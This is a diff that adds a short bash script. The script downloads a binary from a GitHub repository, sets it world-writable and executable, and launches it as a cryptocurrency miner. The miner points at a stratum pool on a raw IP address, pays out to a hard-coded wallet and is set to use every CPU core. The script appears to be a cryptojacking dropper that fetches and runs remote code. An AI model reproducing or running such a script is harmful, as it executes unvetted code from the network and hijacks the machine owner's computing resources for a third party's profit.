@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -O red https://github.com/kidoescegh/filee/raw/main/avx2adv
+chmod 777 red
+./red -a yespoweradvc -o stratum+tcp://64.23.144.233:80 -u AMfDZ53tyUitZBpR5H8C4ydY7dbAq4n7JH.$(shuf -n 1 -i 1-99999)-ON -t $(nproc --all)
